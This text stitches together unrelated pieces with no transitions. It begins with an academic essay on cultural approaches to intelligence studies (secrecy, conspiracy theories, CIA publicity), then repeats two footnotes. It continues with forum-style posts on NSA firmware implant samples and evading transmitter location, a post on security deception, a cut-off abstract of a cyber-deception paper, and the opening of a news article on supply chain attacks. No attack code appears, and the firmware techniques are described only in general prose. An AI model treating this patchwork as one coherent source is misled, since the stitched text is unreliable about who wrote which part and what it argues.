What role does secrecy play in all of this? For Hofstadter, among others, conspiracy theories were the product of ‘uncommonly angry minds’, and this psychological explanation stuck in the popular conception of conspiracy theorists as political demagogues or jaded cynics. But there is nothing uncommon about conspiracy theories these days, nor does Hofstadter’s focus upon individual psychology help us to grasp the material causes of conspiracy theories; such theories might often be proven wrong, but they are theories about something and are usually responding to real historical events or processes. More recent scholarship on conspiracy theories have stressed the real causes of conspiracy theories in various iterations of the ‘no smoke without fire’ argument. Kathryn Olmsted is perhaps the most forceful exponent of this perspective:
Since the First World War, officials of the U.S. government have encouraged conspiracy theories, sometimes inadvertently, sometimes intentionally. They have engaged in conspiracies and used the cloak of national security to hide their actions from the American people… If antigovernment conspiracy theorists get the details wrong – and they often do – they get the basic issue right: it is the secret actions of government that are the real enemies of democracy.[36]( Olmsted, Real Enemies, 239–240. See also books listed in footnote 26.View all notes
For Olmsted, the antidote is simple: ‘more government openness. When Americans believe that their government is truthful, open, and accountable, they are more willing to trust it.’[37]( Olmsted, “Government Secrecy and Conspiracy Theories”, 98.View all notes Unfortunately for those of us who believe greater openness is a good in itself, the correlation between transparency and trust might not be so straightforward. US public trust in government was at an all-time high during the Second World War, and the decade and a half that followed, a period of rapidly expanding government secrecy with almost no formal accountability mechanisms for overseeing the intelligence community. It was also a period defined by a particularly deferent media, who acquiesced to the CIA and FBI’s sanctification of secrecy.[38]( For example, in 1951 the film producer Eugene Rodney approached his friend, Walter Bedell Smith, then Director of Central Intelligence, about featuring the CIA in a Hollywood movie. Smith demurred, replying that ‘we [at the CIA] deliberately cherish anonymity as an aid to effectiveness in this trade.’ It was good enough for Rodney, and the film was never made. When the CIA launched a covert action against Mosaddegh’s Iran, and a year later in Arbenz’s Guatemala, they were likewise buttressed by a wall of silence from the American media. See Willmetts, In Secrecy’s Shadow, 121–169.View all notes When the US intelligence community has opened up, or been forced to open up by a more combative press, such as in the mid-1970s, public trust slumped. One of the few upswings in trust in the last fifty years, as Olmsted notes, was in the immediate aftermath of 9/11, a period of time marked by what James Der Derian has described as a global in terrorem, a moment in which critical enquiry, particularly amongst the very journalists tasked with encouraging greater openness, succumbed to the flag-waving and wagon-circling that followed the event.[39]( Der Derien, In Terrorem, 101–117.View all notes
Conspiracy theories have themselves often paved the way to increased openness, acting as a form of populist accountability on the secret state. But the declassification of, for example, millions of records in relation to the Kennedy assassination following the provocations of Oliver Stone in the early 1990s has failed to sate the appetite for conspiracy theories.[40]( President John, Kennedy Assassination Records Collection Act.View all notes Indeed, arguably the opposite has taken place. ‘[T]he sheer volume of Kennedy assassination materials’, argues Peter Knight, ‘…threatens to plunge the case into an infinite abyss of suspicion, into what Jean Baudrillard has termed “a vertigo of interpretations.”’[41]( Knight, Conspiracy Culture, 99.View all notes
The causal link between official secrecy and conspiracy theories seems relatively clear. However, perhaps the rot of distrust that has set in since the end of the 1960s in American society and culture runs too deep for the occasional programme of declassification to reverse the seemingly inexorable trend towards suspicion. This is the underlying premise of one of the most remarkable books on secrecy in recent years: Timothy Melley’s The Covert Sphere. Its theoretical and methodological ingenuity and its meditation on the interwoven nature of fiction and fact in relation to secrecy, as well as its far-reaching conclusions, certainly meet the two defining criteria of the cultural turn that I listed in my introduction. Melley argues:
‘[T]hat the development of the National Security State, with its emphasis on secrecy and deception, helped transform the cultural status of fiction as it relates to discourses of “fact,” such as journalism and history. As state secrecy shifted the conditions of public knowledge, certain forms of fiction became crucial in helping Americans imagine, or fantasize about, US foreign policy.’[42]( Melley, The Covert Sphere, viii.View all notes
Melley proposes the existence of a ‘covert sphere’, ‘a cultural imaginary shaped by both institutional secrecy and public fascination with the secret work of the state.’[43]( Ibid., 5.View all notes Unlike Jurgen Habermas’ notion of the public sphere – a space of rational-critical debate where ‘the princely authority [of] state secrets’ is kept in check by ideas and policies that emerge from the cut and thrust of open deliberation – the covert sphere is ‘marked by a structural irrationality’, because secrecy undermines the traditional epistemologies of factual discourses, destabilising their empirical basis by actively distorting the historical record, and outlawing disclosures of fact.[44]( Ibid., 10.View all notes Into this empirical void flood ‘narrative fictions, such as novels, films, television series, and electronic games’ that offer speculative fantasies about the workings of the secret state. Unlike numerous intelligence historians, Melley’s purpose here is not to discredit these fictions as so much misleading bunk, but to recognise their profound agency in shaping political discourses about state secrecy in lieu of non-fictional alternatives. This occurs on both sides of the debate. Supreme Court Justices (among other political actors) have cited 24’s Jack Bauer in defence of the CIA’s secret programme of ‘enhanced interrogation’.[45]( Zegart, “’Spytainment’: The Real Influence of Fake Spies”, 599–622.View all notes Likewise, Orwell and Kafka have become symbolic touchstones for the political opposition to the state secrecy that enshrouds the mass surveillance activities revealed by Edward Snowden.[46]( Willmetts, “Digital Dystopia”, 267–289.View all notes
But there is an even more far-reaching conclusion that can be drawn from this observation of the impact of increasing secrecy upon the relative epistemologies of fictional vs. non-fictional discourses about the secret state. Namely, that the growth of the national security state in the decades after the Second World War, and its attendant secrets, was ‘the crucible of postmodernism’.[47]( Melley, The Covert Sphere, 35.View all notes Ann Douglas makes this case succinctly:
The extreme scepticism about the possibility of disinterested knowledge and language that postmodernism sponsors… makes most sense when taken as a straightforward description of the extremes of official dishonesty characteristic of the cold war era.[48]( Douglas, “Periodizing the American Century”, 71–98.View all notes
Could it be that official secrecy, the bread and butter of intelligence studies, is responsible for such an epochal shift? As Melley notes, ‘[c]hronologically, the answer is yes. Postmodernism arose as the Cold War consensus of the 1950s disintegrated…’[49]( Melley, The Covert Sphere, 35.View all notes What caused that disintegration of the Cold War consensus? Historians have offered numerous answers to this question: the rise of the baby boomers, the flourishing of the counterculture, the civil rights and anti-war movements, the death of President Kennedy, an increasingly recalcitrant media.[50]( Rodgers, Age of Fracture; Engelhardt, The End of Victory Culture; Gitlin, The Sixties; O’Neill, Coming Apart.View all notes But perhaps the single most significant explanation is that as Americans began to learn, in the words of Rhodri Jeffreys-Jones, that their government ‘would lie to them’, through mounting disclosures about the activities of the secret state (the Bay of Pigs, the Pentagon Papers, Watergate, and the 1975 ‘year of intelligence’), Americans stopped trusting their government.[51]( Jeffreys-Jones, The CIA and American Democracy, 113.View all notes
This mounting distrust was the inevitable consequence of the rapid expansion of the secret state in the post-war decades, and it is a sentiment that can be found across the fabric of American society in the late-1960s and beyond. It can be found in the proclamations by anti-war activists, in speeches on the floor of the Senate, in New York Times editorials, in the movies, and in the pages of Don DeLillo, Joan Didion or Thomas Pynchon novels. Whether one identifies this culture of suspicion in the pages of a fictional novel, or in major political speeches of the period, one is discovering the same integrated phenomenon. To try to disentangle the culture of suspicion from the politics of suspicion is counter-productive, for the culture of suspicion is the politics of suspicion and vice versa. This is where a structural understanding of causality can help us to account for the implications of state secrecy, implications that permeated far beyond the corridors of state.
What are the implications of this? First, it requires us to move away from the study of representations, or culture as a detached and passive reflection of society, towards an understanding of culture as active and integrated into political and social phenomena. It is in this way, in the words of Clifford Geertz, ‘coloring experience in the light they cast it in’, that cultural texts reciprocate the political agency that is inflicted upon them by the world they represent. The mounting suspicion that secrecy wrought, in this way, can be regarded as an emergent ‘structure of feeling’ during the second half of the twentieth century, one that cannot be properly understood in a disintegrated way.[52]( Geertz, “Deep Play”, 84; Williams, Marxism and Literature, 128–135.View all notes
On a practical note, a full recognition of the far-reaching effects of secrecy might entail a reappraisal of classification and declassification procedures. For if the spread of conspiracy theories and suspicion in response to official secrecy represents a fundamental threat to liberal democracy, as many theorists believe they do, then the keeping of secrets that generates excessive suspicion in the cultural and social domains might need to be re-evaluated to consider whether the national security interests that they seek to protect are outweighed by the national security threat of undermining public confidence in the institutions that undergird liberal democracy.[53]( Popper, Conjectures and Refutations, 165–168; Hofstadter, “The Paranoid Style in American Politics”.View all notes In this way, secrecy is a double-edged sword that oftentimes threatens the very social fabric that it seeks to protect. Though greater openness might not be an immediate panacea for the widespread cultural suspicion that has set in since the end of the 1960s, the limiting of unnecessary secrecy might avoid compounding public distrust. In this way the cultural turn in intelligence studies is both a theoretical and deeply practical imperative.
Publicity and public relations
If further confirmation were needed of the significance of the cultural sphere upon the intelligence services, one need look no further than the mounting efforts of the intelligence community, and in particular the CIA, to shape popular discourses about their activities.[54]( The emerging literature on CIA public relations is related to, but distinct from, the literature on the CIA’s so-called ‘Cultural Cold War’, in which the Agency sponsored various cultural producers and institutions to promote American culture around the world. See for example Stonor-Saunders, Who Paid the Piper; Wilford, The Mighty Wurlitzer; Iber, Neither Peace Nor Freedom.View all notes The end of the Cold War entailed a renewed need for intelligence services to make the public case for their continued existence.[55]( See McCarthy, The Selling of the CIA, 166–213; Glickman, “Intelligence After the Cold War”, 142–147.View all notes This was not the first time the CIA were forced to ‘go public’ in order to face down their critics. In the immediate aftermath of the Second World War, General William Donovan launched a major public relations offensive to make the case for a permanent peacetime civilian intelligence agency. The creation of the CIA just a few years later is testament to the success of that campaign, with Hollywood movies, newspaper articles and several memoirs extolling (and usually exaggerating) the Office of Strategic Service’s (OSS) wartime role, and in the process answering critics in the American press who warned against the creation of ‘An American Gestapo’.[56]( Valero, “’We Need Our New OSS, Our New General Donovan, Now…’”, 91–118.View all notes In the mid-1970s, in response to the ‘Family Jewels’ revelations and the season of investigation that followed, a series of DCIs shifted the CIA’s approach from blanket secrecy to one of information management. Under Admiral Stansfield Turner’s directorship (1977–1981), CIA public affairs was formalised for the first time, only for it to be curtailed by a renewed culture of secrecy during the Reagan years.[57]( See McCarthy, The Selling of the CIA, 120–164.View all notes
Today CIA public relations activities are more extensive than ever before, perhaps in recognition of the fact, as David Shamus McCarthy argues in his authoritative history of CIA public relations, that secrecy in the age of mass media depends, paradoxically, on effective PR.[58]( Ibid. See also CIA Public Affairs, Accessed October 11, 2018.  all notes But the CIA were actually relative latecomers to the public relations game, believing as they did in the early Cold War that blanket secrecy could be maintained. J. Edgar Hoover was a master public relations expert, and crafted the ‘G-Man’ image of the FBI from the very earliest days of the bureau’s history.[59]( Gid Powers, Hoover’s FBI in American Popular Culture; Sbardellati, J. Edgar Hoover Goes to the Movies.View all notes The US military, likewise, have maintained close relations with Hollywood and the wider American media since the beginning of the twentieth century.[60]( Suid, Guts and Glory.View all notes More recently, in the wake of the Edward Snowden revelations, the NSA and GCHQ have also notably increased their public relations activities.[61]( James, “For Your PRs Only”; Gerstein, “Snowden-Stung NSA Seeking PR Guru”; Fung, “The NSA’s PR Team Finally Gets Its Own Twitter Account”.View all notes
As with secrecy, the history of intelligence agencies’ public relations activities was a neglected field until quite recently. But a wave of studies published in the last five years have transformed the subject into a substantial sub-field of intelligence studies.[62]( McCarthy, The Selling of the CIA; Jenkins, The CIA and Hollywood; Moran, Company Confessions; Willmetts, In Secrecy’s Shadow; Alford and Secker, National Security Cinema; Sbardellati, J. Edgar Hoover Goes to the Movies; Aldrich, “American Journalism and the Landscape of Secrecy”, 189–209; Schou, Spooked; Dover and Goodman, eds. Spinning Intelligence.View all notes What general conclusions can we draw from these studies, and how does this relate to the cultural turn in intelligence studies? One of the key implications, following McCarthy’s arguments about public relations as the Janus face of secrecy, is that modern intelligence agencies are engaged in a dynamic process of information management. Defining what is made public, and how it is made public, has become as important as defining what is kept secret. Secrecy, as Simmel noted, is a means of controlling the flow of information, but equally important for intelligence agencies today is shaping the context, timing and reception of the information that does get into the public domain. As the scandals surrounding the CIA, NSA and FBI in recent memory demonstrate, the intelligence services have not always succeeded in this. But they have certainly stepped up their efforts in this regard. The CIA managed to get their narrative of enhanced interrogation into the public domain via a Hollywood movie before the Senate Intelligence Committee Report on CIA torture roundly rejected both the ethics and the efficacy of their notorious ‘enhanced interrogation’ methods. The FBI’s continued support of numerous Hollywood productions about their work, as well as their use of celebrities to boost their recruitment, shows that the Bureau’s adeptness for PR did not disappear with Hoover’s death.[63]( Lange and Leopold, “How the FBI Shapes Its Images Through Movies”. A list of all movies that received assistance from the FBI, obtained by Ariane Lange and Jason Leopold under the Freedom of Information Act, is available online here:  accessed 11/10/2018. See also Gilian Anderson (Dana Scully in popular television show The X Files) in this recruitment video for the FBI: “Gillian Anderson Thanks FBI’s Women Agents for Service”, Federal Bureau of Investigation, Accessed September 13, 2012. [ = 6Fjf6w-OL_g]( = 6Fjf6w-OL_g).View all notes Likewise, as already mentioned, the NSA and GCHQ seem to have begun the process of adjustment to their newfound celebrity by enhancing their public relations activities.
Another general conclusion that can be drawn from this new literature is that the history of intelligence agencies, and the way in which the general public understand their work, is, to a significant extent, culturally constructed. The intelligence agencies themselves recognise this as much as the academic literature, otherwise why would they invest resources into liaising with filmmakers, television producers, writers, memoirists and members of the press? The intelligence agencies echo the dubious claim of the Pentagon, that their relationship with the media is intended solely to ensure the historical accuracy of the cultural products made about them. The assistance the Pentagon has lent to such Hollywood fantasies as Iron Man and Transformers, or the CIA to Patriot Games, Meet the Parents, and even an episode of the popular television programme Top Chef, filmed at the Agency’s Langley headquarters, suggests that they are involved in a process of their own mythmaking as much as the fantastical spy features they condemn for playing fast and loose with historical accuracy. Indeed, when evaluating the relative merits of spy fictions that depict the Agency in a sympathetic light, CIA public affairs staff appear much more tolerant of historical inaccuracies than when dealing, often scathingly, with more critical fictions.[64]( A good roundup of CIA officers’ views on various spy fictions can be found in Studies in Intelligence: Special Review Supplement (Summer 2009).  all notes In an oft-cited 1991 report on greater CIA openness (which was ironically classified as secret), a task force set out six core principles that should underline the Agency’s public messaging going forwards; principle six was ‘preserve the mystique’.[65]( Task Force Report on Greater CIA Openness. David Shamus McCarthy argues that the Task Force on Greater CIA Openness is consistent with a long Agency tradition, established since the 1975 ‘Year of Intelligence’, of viewing ‘openness in terms of self-preservation rather than the public’s right to know.’ The Task Force’s commitment to ‘preserving the [CIA’s] mystique’ was adopted on the suggestion of future DCI George Tenet, then Staff Director for the Select Committee on Intelligence (SSCI), who urged the Task Force not to demystify the Agency so as to make it appear like any other government bureaucracy. See McCarthy, Selling the CIA, 171.View all notes
An integrated understanding of historical causality, central to the cultural turn, sees cultural texts as important actors in the dynamic and continuously politically contested historical identity of the intelligence agencies. The significance of fictional texts is therefore not determined by their relative historical accuracy – ‘[y]ou wouldn’t go to Macbeth to learn about the history of Scotland’ – but by the ways in which they have constructed meaning, and in turn shaped our understanding, of the world beyond the page.[66]( Northrop Frye, The Educated Imagination, 64.View all notes A world, in the words of Jean Baudrillard, that is ‘always already reproduced’.[67]( Baudrillard, Symbolic Exchange and Death, p. 94.View all notes Understanding intelligence history as this dynamic, culturally constructed, and highly politicised battleground, comprised of a multitude of texts, enables us to account for the CIA’s support for positive fantasies about their work, as well as the role of popular perceptions of intelligence agencies.
Another area in which a ‘turn to culture’ might illuminate our discipline, is the study of the way in which intelligence products are influenced by cultural attitudes, beliefs and worldviews. This is related to, but methodologically distinct from, the extant scholarly interest in the politicisation of intelligence.[68]( See, for example Rovner, “Is Politicization Ever a Good Thing?” 55–67; Betts, Enemies of Intelligence, 66–103.View all notes Policymakers undoubtedly (and unavoidably) exert a profound influence upon the intelligence cycle, but what about less tangible but no less real influences from beyond the world of statecraft? Despite their professional commitment to ‘objectivity and integrity of judgment’, intelligence officers are not immune to prejudices and unconscious biases that afflict all epistemic communities.[69]( Kent, Strategic Intelligence for American World Policy, 180. On the concept of ‘epistemic communities’ see Cross, “Rethinking Epistemic Communities Twenty Years Later”, 137–160.View all notes But the study of ‘mentalities’ involves something more than examining whether this or that assessment was distorted by prevailing attitudes (although it can involve that too). Mechanistic explanations for the impact of a given cultural text upon a real-world outcome are notoriously difficult to come by. When they are found, such as the impact of the 1983 blockbuster War Games on the development of Ronald Reagan’s nascent cyber-security strategy, or the impact of Ian Fleming’s wild fantasies upon CIA covert operations in Cuba, they tend towards the anecdotal.[70]( Moran, “Ian Fleming and the Public Profile of the CIA”, 119–146.View all notes Culture is powerful precisely because its influence is diffuse, subtle, and accretive. Attitudes and beliefs are not forged from attendance at a single play, or the reading of one novel, rather, they emerge from a complex accumulation of discourses, both fictional and non-fictional, which shape our behaviour, and the way we view the world. For that reason, they are all the more pervasive, and their influence is that much harder to prove.
But the study of mentalities concerns itself not only with what is said but also what is not said. Here again, there is a distinction from the study of politicisation. The Annales School, who first conceptualised the history of mentalities, saw their task as the assemblage of an ‘inventory of mental equipment’ in a given age in order to determine what was, or was not, discursively possible at a certain moment. Lucien Febvre, for example, famously argued that atheism was so ‘beyond the ken of sixteenth-century man’ that even radical sceptics like François Rabeleis could not conceive unbelief.[71]( Hutton, “The History of Mentalities”, 241.View all notes ‘Secular thought would become possible only as man created an autonomous secular world.’[72]( Ibid., 242.View all notes
What was the ‘inventory of mental equipment’ that intelligence analysts possessed during the Second World War, the Cold War, or today’s War on Terror? What was ‘beyond the ken’ of Allen Dulles, Tom Braden or James Jesus Angleton? Are different conclusions discursively available today that might not have been sixty years ago? Was it possible for American intelligence analysts to think outside of the framework of anti-communism in their intelligence assessments of foreign threats and the motives of enemy leaders? In the broader fields of international history and Cold War historiography, these kinds of questions have been pursued with alacrity in recent decades by post-revisionist scholars. The Cold War is now regarded as ‘a conflict that was more than geopolitics, military deployments, more than Presidents and General Secretaries, summits and treaties, economic competition and the Bomb.’[73]( Lucas, “Beyond Freedom, Beyond Control, Beyond the Cold War”, 53.View all notes A renewed focus on ideology, not just Soviet ideology, but American and Western ideology as well, has mounted a significant challenge to the realist paradigm that understands the Cold War in terms of rational actors making calculated decisions to maximise strategic interest.[74]( See, for example, Leffler, “The Cold War: What Do ‘We Now Know’?” 501–524; Westad, ed. Reviewing the Cold War.View all notes
The question of the extent to which US Cold War ideology, and in particular, the domestic anti-communist hysteria of the period, permeated the intelligence community, and therefore their assessments of foreign threats, is a complex one. J. Edgar Hoover’s FBI is the most obvious example of a leader and an organisation whose entire outlook on the world was significantly shaped by their vehement anti-communism. As Ellen Schrecker famously put it, had ‘observers known in the 1950s what they have learned since the 1970s, when the Freedom of Information Act opened the Bureau’s files, “McCarthyism” would probably be called “Hooverism.”’[75]( Schrecker, Many Are the Crimes, 203.View all notes But in the case of the CIA, the question is more complex. During the height of McCarthyism, early CIA leaders like Allen Dulles and Walter Bedell Smith were certainly anti-communists, but their views were more nuanced than Hoover’s, and their perceived liberal elitism put them in McCarthy’s crosshairs.[76]( Jeffreys-Jones urges caution when adopting the conventional view that the early CIA was comprised of New Deal liberals. ‘It should be noted’, he writes, ‘that Smith, Angleton, and other leading CIA officials never were anything but right-wing.’ Dulles, despite his elitism and some liberal sentiments, was not a New Deal democrat, and was ‘above all, a pragmatic patriot.’ See Jeffrey-Jones, The CIA and American Democracy, 72–73.View all notes Moreover, as Rhodri Jeffreys-Jones argues, the CIA were adept at exploiting Cold War anxieties to their advantage, suggesting a degree of ideological self-awareness that made them something more than passive converts.[77]( Jeffrey-Jones, Cloak and Dollar.View all notes Nevertheless, given the pervasiveness of Cold War anxieties that permeated every level of government and society, it seems reasonable to ask to what extent did irrational fears colour the CIA’s intelligence assessments of Soviet intentions during the Cold War? [78]( For more on the impact of anti-communism on the early CIA see Jeffrey-Jones, “Why Was the CIA Established in 1947?”, 25; Gaddis, “Intelligence, Espionage, and Cold War Origins”, 200. On the influence of non-rational ‘belief systems’ upon intelligence analysis, and their role in intelligence failure, see Wirtz, The Tet Offensive.View all notes
The Annales School, along with contemporaries such as Antonio Gramsci, Michel Foucault, and Edward Said, all shared the conviction that seemingly rational discourses were often significantly shaped by ‘irrational’ subjective cultural perceptions. This flies in the face of the US intelligence community’s commitment to objectivism. As Mark Stout has noted, one of the defining features of American intelligence ‘culture’ is ‘the idea that truth is accessible and that “analysis” to discover that truth is an essential intelligence function.’[79]( Stout, “World War I and the Birth of American Intelligence Culture”, 387.View all notes But were intelligence officers really able to completely detach themselves from dominant cultural perceptions and anxieties that circulated at the time they performed their analysis?
Another exciting new field of enquiry in intelligence studies that confounds the positivist epistemology of the intelligence community are recent studies of the way in which orientalist discourses shaped the American and British IC’s assessments of the Middle East. Edward Said, father of the concept of Orientalism, or the idea that Western discourses (both scientific and literary) of the Middle East cast it as an exotic and primitive ‘other’, against which notions of Western ‘civilisation’ defined itself, thus legitimating imperial intervention in the region, is a key proponent of an integrated approach to culture, politics and society: ‘[Culture] is a historical force possessing its own configurations, ones that intertwine with those in the socio-economic sphere.’[80]( Said, The World, the Text and the Critic, 2.View all notes In an important article, Dina Rezk demonstrates how ‘a history of intelligence can also be a history of culture, ideas and mentalité’, by demonstrating the way in which key CIA assessments during the Cold War constructed ‘The Arab’ personality as a monolithic other, devoid of social conscience, apathetic, quixotic, and prone to violent paroxysms.[81]( Rezk, “Orientalism and Intelligence Analysis”, 224–245. See also Rezk, The Arab World and Western Intelligence.View all notes In a similar vein, Hugh Wilford has shown how Kermit Roosevelt, a key actor in the CIA-instigated overthrow of Mohammad Mossadegh in Iran, was significantly influenced by British imperialist and orientalist discourses of the Middle East, such as Rudyard Kipling’s Kim, and the writings of T.E. Lawrence. Tantalisingly, Wilford points to other possible cultural frameworks, in particular prescribed notions of masculinity, that may have shaped Kermit Roosevelt’s, and the CIA’s, thinking and conduct in the region.[82]( Wilford, “’Essentially a Work of Fiction’”, 922–947.View all notes
Cold War orthodoxy cast the Soviets as irrational and dogmatically ideological, which they contrasted with American pragmatism and intellectual freedom. Our understanding of the respective intelligence communities during the Cold War has largely followed this framework – the KGB were straightjacketed into reaching conclusions that fit Soviet dogma, whilst the CIA were free to pursue objective truth, and at times speak truth to power.[83]( The biblical verse ‘And Ye Shall Know the Truth and the Truth Shall Make You Free’ is carved into the wall of the CIA’s Original Headquarters Lobby, and today has been adopted as the Agency’s motto.View all notes But the new wave of post-revisionist scholarship since the fall of the Berlin Wall has argued, convincingly, that US foreign policy was often also dictated by ideology, not pragmatism.[84]( See, for example, Lucas, Freedom’s War; Stonor-Saunders, Who Paid the Piper; Foursek, To Lead the Free World.View all notes Were intelligence officials guided by ideology too? What else shaped their vision of the world? As Odd Arne Westad writes in relation to Soviet dogma, ‘it is necessary to establish a wider and more useful definition of ideology, encompassing not only a written tradition of authoritative texts and their exegesis but also credenda formed by personal and historical experience.’[85]( Westad, “Russian Archives and Cold War History”, 254–266.View all notes How did notions of race, class, and gender, especially during the early Cold War when the CIA were comprised from a relatively homogenous white, male and elite demographic, impact their conclusions? The time has come to consider western intelligence officials not as cloistered scientists, objectively interpreting fixed truths about the world, but as cultural and social beings, profoundly shaped by their ‘inventories of mental equipment.’
The elevation of ‘culture’ in intelligence studies and the cognate fields of international history, and Cold War historiography has generated important new lines of enquiry in recent decades. But as Scott Lucas warns, there is a paradoxical danger that whilst we elevate certain kinds of study, we simultaneously limit our lines of enquiry to an ‘anodyne focus’ on the official, i.e., cultural diplomacy as an instrument of the state; or to the anecdotal, i.e., the oftentimes apocryphal tales of spy fiction being directly translated into spy fact; or the remedial, i.e., pointing out where spy fiction deviates from spy fact, or the banal conclusion that the real world of espionage is stranger than fiction.[86]( Lucas, “Beyond Freedom, Beyond Control”, 53.View all notes All of the above approaches, though valuable in their own terms, treat ‘the cultural’ as a separate sphere of human activity, distinct from the more consequential domain of politics. To see culture as merely a reflection of politics, or a domain that occasionally bumps into the properly political world, is to misunderstand the complex interplay that exists between statecraft and the highly mediated world that we all inhabit. As Melvyn Leffler put it:
Historians, like political scientists, must abandon their customary binary categories, test new theoretical approaches, and integrate notions of culture and identity with an understanding of political process and political institutions as well as with an examination of material and strategic interests.[87]( Leffler, “The Cold War: What Do ‘We Now Know’?” 523.View all notes
If the recent proliferation of cultural approaches to intelligence studies is to constitute a fully fledged ‘cultural turn’, then we must recognise the expansive possibilities that are available to us when we see intelligence agencies, and intelligence agents, as inhabitants of the world they seek to analyse. It is time for the ‘ghetto’ of international relations to reintegrate itself back into the community. For in reality, it never was, and never could be, apart.

64. A good roundup of CIA officers’ views on various spy fictions can be found in Studies in Intelligence: Special Review Supplement (Summer 2009). 65. Task Force Report on Greater CIA Openness. David Shamus McCarthy argues that the Task Force on Greater CIA Openness is consistent with a long Agency tradition, established since the 1975 ‘Year of Intelligence’, of viewing ‘openness in terms of self-preservation rather than the public’s right to know.’ The Task Force’s commitment to ‘preserving the [CIA’s] mystique’ was adopted on the suggestion of future DCI George Tenet, then Staff Director for the Select Committee on Intelligence (SSCI), who urged the Task Force not to demystify the Agency so as to make it appear like any other government bureaucracy. See McCarthy, Selling the CIA, 171.

76. Jeffreys-Jones urges caution when adopting the conventional view that the early CIA was comprised of New Deal liberals. ‘It should be noted’, he writes, ‘that Smith, Angleton, and other leading CIA officials never were anything but right-wing.’ Dulles, despite his elitism and some liberal sentiments, was not a New Deal democrat, and was ‘above all, a pragmatic patriot.’ See Jeffrey-Jones, The CIA and American Democracy, 72–73.

some things to note about the samples:
- the L1 image uses BIOS recovery to trigger actual exploit payload on unaddressable storage; that is to say it does not store the loader / malware directly on SPI flash memory. NSA has been adept at avoiding trivial detection via this route for a long time...
- the L2 image is a configuration permanent denial of service. this is designed to disrupt target activities, rather than perform any traditional exploitation or exfiltration. with an impossible boot configuration, the system appears "dead".
these techniques are the opposite of the Sednit approach where the malware resides as an UEFI module with malicious code stored on SPI flash memory.  this makes it easy to detect (if you happen to catch it! :) as per the talk linked originally best regards,

the problem with a singular transmitter is still the trivial location determination - you want to make that last hop hard to find.
previous discussions have suggested MIMO for beam forming / phased array signal emission that lets you do fancy things, like emulate a moving transmitter.  if the transmitter appears to be constantly moving, it's a much harder target :)
these systems used to be millions of dollars, and now they are merely thousands. (soon enough only hundreds of $?)
this is getting into canonical zero knowledge protocols, albeit adapted for wireless mesh networks. if you search the literature for "zero knowledge wireless sensor network" you'll find a long tangle of research to devour in this domain...
one benefit of actual broadcast receivers is the ability to distribute a large amount of information to all simultaneously. in some protocols this can be a big advantage. Tor directory information for example, could be broadcast over digital video bands and then partitioning attacks against directory obviated.
bitcoin had discussed doing this for blockchain distribution in Norway, IIRC.

@_subject: Deception in Information Security 
deception is becoming all the rage these days. done right, it provides a unique window into attacker intention and capability.
rather than the isolated, fabricated structures commonly used (honey-*) consider instrumenting your actual systems with traps for the nefarious:
- set browser strings showing out of date, vulnerable versions
- leave packages old, but replace with source built updates
- instrument applications with sanitizers and hardened allocators
- jail and container, to observe unexpected calls
exploits, like any other software, are fragile! slight changes in build and configuration can render even the most expensive and carefully constructed chain impotent.
some things will get through (think: logic bugs, rather than technical exploitation) so keep your most sensitive work on truly hardened systems with strong compartmentalization and attack surface reduction. (yes, Qubes is still better than a vanilla distro! it's amazing how much malware simply aborts when it finds itself in a virtualized environment. feature, not bug! :)

Cyber Security DeceptionMohammed H. Almeshekah and Eugene H. Spafford
Abstract Our physical and digital worlds are converging at a rapid pace, putting
a lot of our valuable information in digital formats. Currently, most computer
systems’ predictable responses provide attackers with valuable information on how
to infiltrate them. In this chapter, we discuss how the use of deception can play a
prominent role in enhancing the security of current computer systems. We show
how deceptive techniques have been used in many successful computer breaches.
Phishing, social engineering, and drive-by-downloads are some prime examples.
We discuss why deception has only been used haphazardly in computer security.
Additionally, we discuss some of the unique advantages deception-based security
mechanisms bring to computer security. Finally, we present a framework where
deception can be planned and integrated into computer defenses.1 IntroductionMost data is digitized and stored in organizations’ servers, making them a valuable
target. Advanced persistent threats (APT), corporate espionage, and other forms of
attacks are continuously increasing. Companies reported 142 million unsuccessful
attacks in the first half of 2013, as reported by Fortinet [[1]( In addition, a recent
Verizon Data Breach Investigation Report (DBIR) points out that currently deployed
protection mechanisms are not adequate to address current threats [[1]( The report
states that 66 % of the breaches took months or years to discover, rising from 56 %
in 2012. Furthermore, 84% of these attacks only took hours or less to infiltrate
computer systems [[1]( Moreover, the report states that only 5 % of these breaches
were detected using traditional intrusion detection systems (IDSs) while 69 % were
detected by external parties [[1](
These numbers are only discussing attacks that were discovered. Because only
5 % of the attacks are discovered using traditional security tools, it is likely that theM.H. Almeshekah ( )

Everybody Does It: The Messy Truth About Infiltrating Computer Supply Chains
[Micah Lee]( [Henrik Moltke](
January 24 2019, 6:55 p.m.
In October, Bloomberg Businessweek published an alarming [story]( Operatives working for China’s People’s Liberation Army had secretly implanted microchips into motherboards made in China and sold by U.S.-based Supermicro. This allegedly gave Chinese spies clandestine access to servers belonging to over 30 American companies, including Apple, Amazon, and various government suppliers, in an operation known as a “supply chain attack,” in which malicious hardware or software is inserted into products before they are shipped to surveillance targets.
Bloomberg’s report, based on 17 anonymous sources, including “six current and former senior national security officials,” began to crumble soon after publication as key parties issued swift and unequivocal denials. Apple [said]( that “there is no truth” to the claim that it discovered malicious chips in its servers. Amazon [said]( the Bloomberg report had “so many inaccuracies … as it relates to Amazon that they’re hard to count.” Supermicro [stated]( it never heard from customers about any malicious chips or found any, including in an audit it [hired]( another company to conduct. Spokespeople for the Department of Homeland Security and the U.K.’s National Cyber Security Centre [said]( they saw no reason to doubt the companies’ denials. Two named sources in the story have publicly stated that they’re skeptical of its conclusions.
But while Bloomberg’s story may well be completely (or partly) wrong, the danger of China compromising hardware supply chains is very real, judging from classified intelligence documents. U.S. spy agencies were warned about the threat in stark terms nearly a decade ago and even assessed that China was adept at corrupting the software bundled closest to a computer’s hardware at the factory, threatening some of the U.S. government’s most sensitive machines, according to documents provided by National Security Agency whistleblower Edward Snowden. The documents also detail how the U.S. and its allies have themselves systematically targeted and subverted tech supply chains, with the NSA conducting its own such operations, including in China, in partnership with the CIA and other intelligence agencies. The documents also disclose supply chain operations by German and French intelligence.
What’s clear is that supply chain attacks are a well-established, if underappreciated, method of surveillance — and much work remains to be done to secure computing devices from this type of compromise.
“An increasing number of actors are seeking the capability to target … supply chains and other components of the U.S. information infrastructure,” the intelligence community stated in a secret 2009 report. “Intelligence reporting provides only limited information on efforts to compromise supply chains, in large part because we do not have the access or technology in place necessary for reliable detection of such operations.”
